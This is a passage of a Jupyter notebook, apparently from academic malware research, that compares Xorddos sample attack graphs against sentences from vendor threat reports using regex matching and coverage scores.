{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import re\n",
    "import os\n",
    "from os import listdir\n",
    "from os.path import isfile, join\n",
    "from pathlib import Path\n",
    "import pandas as pd\n",
    "import pickle\n",
    "from typing import Dict, List, get_type_hints\n",
    "from styleframe import StyleFrame, Styler\n",
    "from IPython.display import display\n",
    "\n",
    "''' 自己寫的模組 '''\n",
    "from cc_regex_script import RegexMatchResult, RegexMaster \n",
    "from cc_nlp_script import find_verb_of_vocab, OperationMode, OperationEvaluator\n",
    "from cc_module_cust import AttackGraph, Node, Edge, FileTable #, build"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Load 所有 Dofloo 的 object，計算並儲存其 regex"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "family Xorddos has numOfSample 21, first is 07c070b717a23453a2b71c7582d6a928\n",
      "samplename: ['0aefb67c01a24d05351b093455203fa2']\n"
     ]
    }
   ],
   "source": [
    "family = 'Xorddos' # Dofloo Xorddos\n",
    "\n",
    "sample_info = pd.read_csv('../../C malware info/sample_info.csv')\n",
    "dofloo_info = sample_info[(sample_info['family'] == family) & \n",
    "            (~sample_info['filename'].isin(['8845355172c485813872f1bb1834de15.bin']))]\n",
    "samplename_lst = dofloo_info['filename'].to_list()\n",
    "samplename_lst = [name.split('.')[0] for name in samplename_lst]\n",
    "print(f\"family {family} has numOfSample {len(samplename_lst)}, first is {samplename_lst[0]}\")\n",
    "\n",
    "if family == 'Dofloo':\n",
    "    samplename_lst = ['0046a78514a658b9b7a4e29e8581f85b'] # 只先使用這個 dof sample\n",
    "if family == 'Xorddos':\n",
    "    samplename_lst = ['0aefb67c01a24d05351b093455203fa2'] # 只先使用這個 xor sample\n",
    "\n",
    "print('samplename:', samplename_lst)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "True\n",
      "{<OP act=a, obj=a>}\n"
     ]
    }
   ],
   "source": [
    "def prettifyName(item:str) -> str:\n",
    "    pretty_name = {\n",
    "        r\"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\": \"ip_addr\",\n",
    "        r\"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+\": \"ip_addr+port\",\n",
    "        r\"0x[0-9a-zA-Z]{8}\": \"mem_addr\",\n",
    "        r\"permission:{0,1}[0-9]{0,4}\": \"permission_id\"\n",
    "    }\n",
    "    changed = pretty_name.get(item, None)\n",
    "    if changed:\n",
    "        return changed\n",
    "    return item\n",
    "\n",
    "class OperationPair:\n",
    "    SYSCALL = 0\n",
    "    VERB = 1\n",
    "\n",
    "    def __init__(self, action:str, object:str, type:int=0, subject:str=None, step_number:int=None, original_object=None, original_sentence=None):\n",
    "        self.object:str = object # regex\n",
    "        self.action:str = action # verb or syscall\n",
    "        self.type:int = type\n",
    "        self.subject:str = subject\n",
    "        self.step_number:int = step_number\n",
    "        self.original_object:str = original_object # can store original matched word (object) from CTD\n",
    "        self.original_sentence:str = original_sentence # can store the mathced sentence\n",
    "        pass\n",
    "\n",
    "    def __eq__(self, other): \n",
    "        if not isinstance(other, OperationPair):\n",
    "            # don't attempt to compare against unrelated types\n",
    "            return NotImplemented\n",
    "        # Same if <action, object> pair is same (type is not consider yet)\n",
    "        return self.action == other.action and self.object == other.object\n",
    "\n",
    "    def __hash__(self) -> int:\n",
    "        # necessary for instances to behave sanely in dicts and sets.\n",
    "        return hash((self.action, self.object))\n",
    "\n",
    "    def __str__(self) -> str:\n",
    "        if self.step_number:\n",
    "            return f\"<OP{self.step_number:>2} act={self.action}, obj={prettifyName(self.object)}>\"\n",
    "        return f\"<OP act={self.action}, obj={prettifyName(self.object)}>\"\n",
    "    def __repr__(self) -> str:\n",
    "        return str(self)\n",
    "    def getSentStr(self) -> str:\n",
    "        '''return string contains original_object & flat_sentence'''\n",
    "        flat_sentence = \" \".join(self.original_sentence.splitlines())\n",
    "        return f\"<OP{self.step_number:>2} act={self.action}, obj={prettifyName(self.original_object)}, sent={flat_sentence}>\"\n",
    "        \n",
    "# test case\n",
    "p_aa = OperationPair('a','a')\n",
    "p_aaz = OperationPair('a','a')\n",
    "p_ab = OperationPair('a','b')\n",
    "\n",
    "print(p_aa == p_aaz) # True\n",
    "print(set([p_aa, p_aaz])) # one element\n",
    "\n",
    "def construct_sample_OPset(step_list: list, keep_src_node=False, debug=False, rt_order=True) -> set:\n",
    "    '''return a list of OPset. RegexMaster and family are gobal variable.'''\n",
    "    if debug:\n",
    "        print('step_list len:', len(set(step_list)))\n",
    "    OPlst_raw = list((src_node.name, dst_node.name, syscall) for (src_node, dst_node, syscall) in step_list) # object is raw\n",
    "    OPset_raw = list(dict.fromkeys(OPlst_raw))\n",
    "    if debug:\n",
    "        print('OPlst_raw len:', len(OPlst_raw)) # why len is 123100? (while step_list len is 7775) (must be equal)\n",
    "        print(f\"OPlst_raw: {OPlst_raw[:10]}\")\n",
    "        print('OPset_raw len:', len(OPset_raw)) # len is 5925 for xor\n",
    "        print(f\"OPset_raw: {OPset_raw[:10]}\")\n",
    "    regexMaster = RegexMaster(familyname=family)\n",
    "    regex_pool = regexMaster.get_all_regex()\n",
    "    OPset = set()\n",
    "    OPset_ordered = list()\n",
    "    for (src_node, dst_node, syscall) in OPset_raw:\n",
    "        regex_dst_node_list = RegexMaster.find_spacial_token_with_regex(regex_pool, dst_node)\n",
    "        if regex_dst_node_list is None or len(regex_dst_node_list) == 0:\n",
    "            continue\n",
    "        for regex_result in regex_dst_node_list:\n",
    "            dst_node = regex_result.match_regex\n",
    "            step_number = len(OPset) + 1\n",
    "            if keep_src_node:\n",
    "                op = OperationPair(syscall, dst_node, subject=src_node, step_number=step_number)\n",
    "                OPset.add(op) # keep src_node in OP\n",
    "                if op not in OPset_ordered:\n",
    "                    OPset_ordered.append(op)\n",
    "            else:\n",
    "                op = OperationPair(syscall, dst_node, step_number=step_number)\n",
    "                OPset.add(op) # only dst_node, syscall in OP\n",
    "                if op not in OPset_ordered:\n",
    "                    OPset_ordered.append(op)\n",
    "    if debug:\n",
    "        print('OPset len:', len(OPset), 'OPset_ordered len:', len(OPset_ordered))\n",
    "    if rt_order:\n",
    "        return OPset, OPset_ordered\n",
    "    return OPset\n",
    "\n",
    "# def construct_sample_stepList(step_list: list, keep_src_node=False, debug=False) -> list:\n",
    "#     ''''''\n",
    "#     pass\n",
    "\n",
    "# test\n",
    "# sample_OPset = construct_sample_OPset(asg.step_list, debug=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Exam: sample S1 matches 31 of regex\n",
      "Size of regex_pool: 31, size of total_used_regex: 0\n"
     ]
    }
   ],
   "source": [
    "class Sample:\n",
    "    def __init__(self, samplename:str, regex_set:set=None, special_token_dict=None, step_list=None) -> None:\n",
    "        self.samplename: str = samplename\n",
    "        self.regex_set: set = set()\n",
    "        if regex_set:\n",
    "            self.regex_set = regex_set\n",
    "        self.special_token_dict = {}\n",
    "        if special_token_dict:\n",
    "            self.special_token_dict: dict = special_token_dict # list of dict\n",
    "        if step_list:\n",
    "            self.step_list = step_list\n",
    "            OPset, OPset_ordered = construct_sample_OPset(step_list)\n",
    "            self.OPset: set[OperationPair] = OPset\n",
    "            self.OPset_ordered: list[OperationPair] = OPset_ordered # 依照出現順序排序的 OPset (元素相同順序不同)\n",
    "            self.OPset_sysOnly_ordered = [] # 尚未初始化 只儲存改變系統狀態的 OP 的物件\n",
    "            self.OPset_sysOnly_ordered_index = [] # 尚未初始化 只儲存改變系統狀態的 OP 的 index\n",
    "            del OPset, OPset_ordered\n",
    "        pass\n",
    "    def __repr__(self) -> str:\n",
    "        return f\"<Sample self.samplename>\"\n",
    "\n",
    "''' 讀取 ASG 中的 set_of_object (就是這個樣本的 special_token_dict)，並歸納樣本的 regex_set '''\n",
    "regexMaster = RegexMaster(familyname=family)\n",
    "regex_pool = regexMaster.get_all_regex()\n",
    "# total_used_regex = set()\n",
    "samples: list[Sample] = []\n",
    "for samplename in samplename_lst:\n",
    "    with open(f'../../C ASG statistics 1115ver/saved_pkl/{family}/{samplename}.pkl', 'rb') as inp:\n",
    "        asg: AttackGraph = pickle.load(inp) # asg.set_of_object is dict() (key:spacial token, value: type 首字大寫)\n",
    "        sample = Sample(samplename, special_token_dict=asg.set_of_object, step_list=asg.step_list)\n",
    "        sample.regex_set = set(regex_pool) # 直接使用志剛寫的作為這個樣本的 baseline\n",
    "        # for obj in sample.special_token_dict.keys():\n",
    "        #     matched_list: list[RegexMatchResult] = regexMaster.find_spacial_token(obj)\n",
    "        #     if matched_list:\n",
    "        #         # print(obj, matched_list)\n",
    "        #         [sample.regex_set.add(m.match_regex) for m in matched_list]\n",
    "        #         # [total_used_regex.add(m.match_regex) for m in matched_list]\n",
    "        # print('------', sample.regex_set)\n",
    "        # break\n",
    "        samples.append(sample)\n",
    "    # del asg\n",
    "print(f'Exam: sample S1 matches {len(samples[0].regex_set)} of regex')\n",
    "print(f'Size of regex_pool: {len(regex_pool)}, size of total_used_regex: {len(regexMaster.used_regex_set)}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "set()"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# 只差這四個不在 asg set_of_object 中 {'0x[0-9a-zA-Z]{8}', 'GID', 'UID', 'port \\\\d{1,5}$'}\n",
    "set(regex_pool) - samples[0].regex_set"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "' Save result to txt file 沒事不要 run ! '"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "''' Save result to txt file 沒事不要 run ! '''\n",
    "# total_regex = set()\n",
    "# with open('./result/countof_regexset.txt', 'w', encoding='utf-8') as opf:\n",
    "#     # header\n",
    "#     opf.write('{:12s}'.format('Sample no.'))\n",
    "#     for i in range(len(samples)):\n",
    "#         if i+1 < 10:\n",
    "#             opf.write(f' S{i+1} ')\n",
    "#         else:\n",
    "#             opf.write(f'S{i+1} ')\n",
    "#     opf.write('\\n')\n",
    "#     # opf.write('{:12s}'.format('# of regex'))\n",
    "#     num_of_regex_string = '{:12s}'.format('# of regex')\n",
    "#     num_of_objects_string = '{:12s}'.format('# of object ') # 所有的類別喔! 無過濾\n",
    "#     for i in range(len(samples)):\n",
    "#         # opf.write(f'{len(samples[i].regex_set):>3} ')\n",
    "#         num_of_regex_string += f'{len(samples[i].regex_set):>3} '\n",
    "#         num_of_objects_string += f'{len(samples[i].special_token_dict):>3} '\n",
    "#     opf.write(num_of_objects_string+'\\n')\n",
    "#     opf.write(num_of_regex_string)\n",
    "#     opf.write('\\n{:12s}'.format('Sample hash'))\n",
    "#     for i in range(len(samples)):\n",
    "#         opf.write(f'{samples[i].samplename[:3]:>3} ')\n",
    "#     opf.write('\\n\\n')\n",
    "#     opf.write(f'Size of regex_pool: {len(regex_pool)}, size of total_used_regex: {len(regexMaster.used_regex_set)}\\n\\n')\n",
    "\n",
    "#     # content of each sample\n",
    "#     for i,s in enumerate(samples):\n",
    "#         content_1 = f\"S{i+1} has {len(s.regex_set)} of regex\\n\"\n",
    "#         content_2 = f\"regex_set: {s.regex_set}\\n\"\n",
    "#         content_3 = f\"special_token_dict: {s.special_token_dict.keys()}\\n\"\n",
    "#         opf.writelines([content_1, content_2, content_3])\n",
    "#         opf.write('\\n\\n')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Load Reports"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['Xorddos-Cdnetworks.csv',\n",
       " 'Xorddos-Crowdstrike.csv',\n",
       " 'Xorddos-Intezer.csv',\n",
       " 'Xorddos-Ms.csv',\n",
       " 'Xorddos-Trendmicro.csv',\n",
       " 'Xorddos-Trendmicro2.csv']"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "report_fir_path = '../../C parse report/sentence csvs/'\n",
    "# family, samplename, outputfolder = 'Xorddos', '???', './result'\n",
    "outputfolder = './result'\n",
    "\n",
    "def get_all_filenames(dir: str='./') -> list:\n",
    "    ''' traverse root directory, and list directories as dirs and files as files. Return filenames in rootdir. '''\n",
    "    files = [f for f in listdir(dir) if isfile(join(dir, f))]\n",
    "    files.sort()\n",
    "    return files\n",
    "\n",
    "xor_report_names = [f for f in get_all_filenames(report_fir_path) if f.startswith(family)] # 只選擇這個家族的報告\n",
    "xor_report_dfs = [pd.read_csv(f\"{report_fir_path}{f}\") for f in xor_report_names]\n",
    "xor_report_names"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Number</th>\n",
       "      <th>Content</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>Sentence 1</td>\n",
       "      <td>understanding a xor.ddos attack\\n2月 17, 2021\\n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>Sentence 2</td>\n",
       "      <td>xor.ddos is the name of the malware, not the a...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>Sentence 3</td>\n",
       "      <td>it was detected in september 2014 and the anal...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>Sentence 4</td>\n",
       "      <td>is a distributed denial-of-service attack from...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>Sentence 5</td>\n",
       "      <td>in many ways it is and in this guide, we will ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>Sentence 6</td>\n",
       "      <td>what is xor.ddos malware?</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>Sentence 7</td>\n",
       "      <td>the traditional attack utilized the existing v...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>Sentence 8</td>\n",
       "      <td>however, xor.ddos makes windows pcs into zombi...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>Sentence 9</td>\n",
       "      <td>the xor.ddos attack is used to defeat the netw...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>Sentence 10</td>\n",
       "      <td>this is a very serious threat to the network b...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>Sentence 11</td>\n",
       "      <td>in addition to these primary targets, the udp ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>Sentence 12</td>\n",
       "      <td>however, the xor.ddos attack uses the tcp, whi...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>Sentence 13</td>\n",
       "      <td>a brute force attack tries many random passwor...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13</th>\n",
       "      <td>Sentence 14</td>\n",
       "      <td>there are various types of brute force attacks...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14</th>\n",
       "      <td>Sentence 15</td>\n",
       "      <td>origin of xor.ddos attacks\\n77.1 % of xor.ddos...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15</th>\n",
       "      <td>Sentence 16</td>\n",
       "      <td>many large-scale cloud service providers were ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>16</th>\n",
       "      <td>Sentence 17</td>\n",
       "      <td>in addition, as ssh services (22/tcp) are bein...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>17</th>\n",
       "      <td>Sentence 18</td>\n",
       "      <td>countermeasures against xor.ddos attacks\\nthe ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>18</th>\n",
       "      <td>Sentence 19</td>\n",
       "      <td>syn is just a process to perform a 3-way hands...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>19</th>\n",
       "      <td>Sentence 20</td>\n",
       "      <td>if syn packets with data are detected, the xor...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>20</th>\n",
       "      <td>Sentence 21</td>\n",
       "      <td>in addition, it is good to use a syn cookie ag...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>21</th>\n",
       "      <td>Sentence 22</td>\n",
       "      <td>the syn cookie blocks syn spoofing effectively...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22</th>\n",
       "      <td>Sentence 23</td>\n",
       "      <td>the syn cookie does not require a certain time...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>23</th>\n",
       "      <td>Sentence 24</td>\n",
       "      <td>therefore, the syn cookie is a very effective ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>24</th>\n",
       "      <td>Sentence 25</td>\n",
       "      <td>alternatively, first syn drop can be a second ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25</th>\n",
       "      <td>Sentence 26</td>\n",
       "      <td>this technique works by saving the first syn p...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>26</th>\n",
       "      <td>Sentence 27</td>\n",
       "      <td>if the session request is normal, the same ip ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>27</th>\n",
       "      <td>Sentence 28</td>\n",
       "      <td>if the request is made for attack, another syn...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>28</th>\n",
       "      <td>Sentence 29</td>\n",
       "      <td>conclusion – get a ddos mitigation service\\na ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>29</th>\n",
       "      <td>Sentence 30</td>\n",
       "      <td>the content delivery network industry can prov...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>30</th>\n",
       "      <td>Sentence 31</td>\n",
       "      <td>as the services are cloud-based, the available...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31</th>\n",
       "      <td>Sentence 32</td>\n",
       "      <td>with these services, most companies will benef...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "         Number                                            Content\n",
       "0    Sentence 1  understanding a xor.ddos attack\\n2月 17, 2021\\n...\n",
       "1    Sentence 2  xor.ddos is the name of the malware, not the a...\n",
       "2    Sentence 3  it was detected in september 2014 and the anal...\n",
       "3    Sentence 4  is a distributed denial-of-service attack from...\n",
       "4    Sentence 5  in many ways it is and in this guide, we will ...\n",
       "5    Sentence 6                          what is xor.ddos malware?\n",
       "6    Sentence 7  the traditional attack utilized the existing v...\n",
       "7    Sentence 8  however, xor.ddos makes windows pcs into zombi...\n",
       "8    Sentence 9  the xor.ddos attack is used to defeat the netw...\n",
       "9   Sentence 10  this is a very serious threat to the network b...\n",
       "10  Sentence 11  in addition to these primary targets, the udp ...\n",
       "11  Sentence 12  however, the xor.ddos attack uses the tcp, whi...\n",
       "12  Sentence 13  a brute force attack tries many random passwor...\n",
       "13  Sentence 14  there are various types of brute force attacks...\n",
       "14  Sentence 15  origin of xor.ddos attacks\\n77.1 % of xor.ddos...\n",
       "15  Sentence 16  many large-scale cloud service providers were ...\n",
       "16  Sentence 17  in addition, as ssh services (22/tcp) are bein...\n",
       "17  Sentence 18  countermeasures against xor.ddos attacks\\nthe ...\n",
       "18  Sentence 19  syn is just a process to perform a 3-way hands...\n",
       "19  Sentence 20  if syn packets with data are detected, the xor...\n",
       "20  Sentence 21  in addition, it is good to use a syn cookie ag...\n",
       "21  Sentence 22  the syn cookie blocks syn spoofing effectively...\n",
       "22  Sentence 23  the syn cookie does not require a certain time...\n",
       "23  Sentence 24  therefore, the syn cookie is a very effective ...\n",
       "24  Sentence 25  alternatively, first syn drop can be a second ...\n",
       "25  Sentence 26  this technique works by saving the first syn p...\n",
       "26  Sentence 27  if the session request is normal, the same ip ...\n",
       "27  Sentence 28  if the request is made for attack, another syn...\n",
       "28  Sentence 29  conclusion – get a ddos mitigation service\\na ...\n",
       "29  Sentence 30  the content delivery network industry can prov...\n",
       "30  Sentence 31  as the services are cloud-based, the available...\n",
       "31  Sentence 32  with these services, most companies will benef..."
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xor_report_dfs[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 單篇文章的 Class 和 整個 Family 的 Class\n",
    "`baseline: Dict[str, list]` 改為 `regexMaster: RegexMaster`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "class ReportEvalModel:\n",
    "    def __init__(self, regex_set: set, sentences: pd.DataFrame, reportname:str=''):\n",
    "        self.regex_pool: set[str] = regex_set # 樣本or家族含有的 regex 集合\n",
    "        self.sentences = sentences # a df\n",
    "        self.reportname = reportname\n",
    "        cols = list(regex_pool)\n",
    "        self.match_tbl = pd.DataFrame([[0]*len(cols)]*len(sentences), columns=cols)\n",
    "        self.match_word:dict[(int,str), str] = dict() # key(idx_sent,regex) value(word:str)\n",
    "        self.match_regex = set()\n",
    "        self.doc_OPset:set[OperationPair] = set() # Set of doc's OperationalPair\n",
    "        self.match_doc_OPset:set[OperationPair] = set()\n",
    "        self.OPset_order_index = [] # 紀錄 ASG OP 的出現順序 (lifecycle)\n",
    "        self.SysOPset_order_index = [] # 只紀錄改變系統的\n",
    "        # self.asgSysOPset_order_index = []\n",
    "        # self.regexMaster = regexMaster # 其實應該用 class function 就不用傳入一個物件\n",
    "        self.match()\n",
    "\n",
    "    def match(self) -> None:\n",
    "        '''find baseline in sentences of report. Fill matching result in self.match_tbl.'''\n",
    "        sentence_list = self.sentences['Content']\n",
    "        for idx_sent, sent in enumerate(sentence_list):\n",
    "            # print(idx_sent, sent)\n",
    "            # find regexs in a sentence\n",
    "            matched_list: list[RegexMatchResult] = RegexMaster.find_spacial_token_with_regex(self.regex_pool, sent)\n",
    "            if not matched_list:\n",
    "                continue\n",
    "            for m in matched_list:\n",
    "                this_re = m.match_regex\n",
    "                matched_word = m.word\n",
    "                self.match_word[(idx_sent,this_re)] = m.word # 紀錄被 search 到的單字\n",
    "                # self.match_tbl.loc[idx_sent,this_re] = 1 # mark as found 節省空間\n",
    "                self.match_regex.add(this_re)\n",
    "                en_verb = find_verb_of_vocab(sent, m.word)\n",
    "                # print(f\"---\\nen_verb: {en_verb}, m.word: {m.word}, sent: {sent}\") # 列印所有動詞抓取情形\n",
    "                stepn = len(self.doc_OPset) + 1\n",
    "                if en_verb:\n",
    "                    self.doc_OPset.add(OperationPair(en_verb, this_re, type=OperationPair.VERB, original_object=m.word, \n",
    "                    step_number=stepn, original_sentence=sent)) # has verb\n",
    "                else:\n",
    "                    self.doc_OPset.add(OperationPair(None, this_re, type=OperationPair.VERB, original_object=m.word, step_number=stepn)) # no verb\n",
    "        pass\n",
    "    \n",
    "    def get_match_sentences(self) -> pd.DataFrame:\n",
    "        result = self.match_tbl.copy()\n",
    "        result['match'] = result.sum(axis=1)\n",
    "        return result\n",
    "    \n",
    "    def get_match_regexs(self) -> set:\n",
    "        return self.match_regex\n",
    "\n",
    "    def get_match_word(self, idx_sent:int, regex:str) -> str:\n",
    "        return self.match_word[(idx_sent, regex)]\n",
    "\n",
    "class FamilySet:\n",
    "    '''一個 malware family report 集合'''\n",
    "    def __init__(self, familyname:str, regexMaster: RegexMaster, sample: Sample=None):\n",
    "        self.familyname = familyname\n",
    "        self.regexMaster = regexMaster\n",
    "        self.num_of_used_regex = len(regexMaster.used_regex_set) # 這個家族含規則的總數量 (unoin by all samples)\n",
    "        self.sample = None\n",
    "        if sample:\n",
    "            self.sample = sample\n",
    "            self.num_of_used_regex = len(sample.regex_set) # 改以這個樣本規則的總數量為基準\n",
    "        self.rem_lst: List[ReportEvalModel] = [] # list of ReportEvalModel under this family\n",
    "        self.result_tbl = None\n",
    "\n",
    "    def add_rem(self, sentences: pd.DataFrame, reportname: str=''):\n",
    "        '''新增 report 到 FamilySet 中，需傳入文本和報告名稱，會沿用 FamilySet 的 baseline.'''\n",
    "        if self.sample:\n",
    "            rem = ReportEvalModel(list(self.sample.regex_set), sentences, reportname) # 基準是 Sample\n",
    "            self.rem_lst.append(rem)\n",
    "            return\n",
    "        rem = ReportEvalModel(self.regexMaster, sentences, reportname) # 基準是 Family union # need fix -> no first arg now\n",
    "        self.rem_lst.append(rem)\n",
    "\n",
    "    def calc_report_coverage_score(self, match_regexs: list[str], apply_weight=False) -> float:\n",
    "        '''計算這篇報告的 coverage_score，未處理分母為0之情形'''\n",
    "        if not apply_weight:\n",
    "            return len(match_regexs) / self.num_of_used_regex # 無權種的算法，分母是家族 wide\n",
    "        ''' 以下 有權重的算法尚未修改，必出 bug '''\n",
    "        # denominator = sum(self.regexMaster['weight']) # 分母\n",
    "        # numerator = 0 # 分子\n",
    "        # for b, w in zip(self.regexMaster['text'], self.regexMaster['weight']):\n",
    "        #     if b in match_baselines:\n",
    "        #         numerator += w\n",
    "        # return numerator/denominator\n",
    "\n",
    "    def show_result(self, apply_weight: bool=False, base_on_sample = True):\n",
    "        '''print and return result table. baselinse(x) * report(y).'''\n",
    "        column_names = ['report_name','ttl_match','coverage_score']\n",
    "        if base_on_sample:\n",
    "            column_names.extend(list(self.sample.regex_set))\n",
    "        else:\n",
    "            column_names.extend(list(regexMaster.used_regex_set))\n",
    "        result_tbl = pd.DataFrame([[0]*len(column_names)]*len(self.rem_lst), columns=column_names)\n",
    "        for i,rem in enumerate(self.rem_lst):\n",
    "            match_regexes = rem.get_match_regexs() # 這篇報告含有哪些 baseine:set\n",
    "            c_score = self.calc_report_coverage_score(match_regexes, apply_weight=apply_weight)\n",
    "            result_tbl.loc[i,'report_name'] = rem.reportname\n",
    "            result_tbl.loc[i,'ttl_match'] = len(match_regexes)\n",
    "            result_tbl.loc[i,'coverage_score'] = f'{c_score:.4}'\n",
    "            for b in match_regexes:\n",
    "                result_tbl.loc[i,b] = 1\n",
    "            print(rem.reportname, match_regexes)\n",
    "        display(result_tbl)\n",
    "        return result_tbl"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Run Script: 存檔每篇報告的 matched sentence (以樣本的 regex set 為基準)\n",
    "比較樣本間的辨別度，有 n 個樣本，就會跑 n 變，得出 n 個結果 (FanilySet)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os, psutil\n",
    "def print_mem_usage():\n",
    "    process = psutil.Process(os.getpid())\n",
    "    mem_usage = psutil.Process(os.getpid()).memory_info().rss / 1024 ** 2\n",
    "    print(f\"=== mem_usage: {mem_usage:.2f} MB ===\")  # in MiB \n",
    "\n",
    "def get_mem_usage() -> int:\n",
    "    # process = psutil.Process(os.getpid())\n",
    "    mem_usage = psutil.Process(os.getpid()).memory_info().rss / 1024 ** 2\n",
    "    return mem_usage\n",
    "\n",
    "def run_family_set_procedure(sample: Sample) -> FamilySet:\n",
    "    # family, regexMaster is global variable\n",
    "    fset = FamilySet(family, regexMaster, sample=sample)\n",
    "    for i,rdf in enumerate(xor_report_dfs):\n",
    "        # rem = ReportEvalModel(base_data, rdf, dofloo_report_names[i])\n",
    "        fset.add_rem(rdf, xor_report_names[i])\n",
    "    # result_tbl = fset.show_result(apply_weight=False)\n",
    "    # result_tbl.to_csv(f'{outputfolder}/{family}_{sample.samplename[:3]}_FamilySet_by_Regex.csv', index=False)\n",
    "    # print(f\"Sample {sample.samplename[:3]} has ttl_match {result_tbl['ttl_match'].sum()} on all documents.\") \n",
    "\n",
    "    # Calculate metrics\n",
    "    print_mem_usage()\n",
    "    print(f\"asg_object: {set([op.object for op in sample.OPset])}\\n\")\n",
    "    fset.sample.OPset_sysOnly_ordered = [op for op in sample.OPset if op.object.find('/etc') != -1]\n",
    "    fset.sample.OPset_sysOnly_ordered_index = [sample.OPset_ordered.index(op) for op in fset.sample.OPset_sysOnly_ordered]\n",
    "    for idx_rem, rem in enumerate(fset.rem_lst):\n",
    "        # asg_object = set([op.object for op in sample.OPset])\n",
    "        # ctd_object = set([op.object for op in rem.doc_OPset])\n",
    "        # if rem.reportname != 'Xorddos-Ms.csv': # 除錯用\n",
    "        #     continue\n",
    "        print(f\"\\nSample {rem.reportname}\")\n",
    "        print(f\"\\tnum of segment in report: {len(rem.sentences)}\")\n",
    "        print(f\"\\tlenght of ctd's OPset is {len(rem.doc_OPset)}\")\n",
    "\n",
